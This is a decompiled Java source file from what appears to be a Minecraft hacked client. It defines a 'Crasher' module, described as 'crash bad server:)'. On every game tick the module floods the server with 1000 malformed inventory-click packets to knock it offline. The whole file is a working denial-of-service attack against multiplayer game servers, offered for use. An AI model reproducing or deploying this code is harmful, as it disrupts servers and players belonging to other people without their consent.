//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\user\Desktop\1.12 stable mappings"!

package dev.madcat.m3dc3t.features.modules.misc;

import dev.madcat.m3dc3t.M3dC3t;
import dev.madcat.m3dc3t.features.modules.Module;
import dev.madcat.m3dc3t.features.setting.Setting;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.util.EnumHand;

public class Crasher extends Module {
  private final Setting<Boolean> escoff = register(new Setting("Disable", Boolean.valueOf(true)));
  
  public Crasher() {
    super("Crasher", "crash bad server:).", Module.Category.MISC, true, false, false);
  }
  
  public void onLogout() {
    if (((Boolean)this.escoff.getValue()).booleanValue() && M3dC3t.moduleManager.isModuleEnabled("Crasher"))
      disable(); 
  }
  
  public void onLogin() {
    if (((Boolean)this.escoff.getValue()).booleanValue() && M3dC3t.moduleManager.isModuleEnabled("Crasher"))
      disable(); 
  }
  
  public void onTick() {
    if (fullNullCheck())
      return; 
    for (int j = 0; j < 1000; j++) {
      ItemStack item = new ItemStack(mc.player.getHeldItem(EnumHand.MAIN_HAND).getItem());
      CPacketClickWindow packet = new CPacketClickWindow(0, 69, 1, ClickType.QUICK_MOVE, item, (short)1);
      mc.player.connection.sendPacket((Packet)packet);
    } 
  }
}
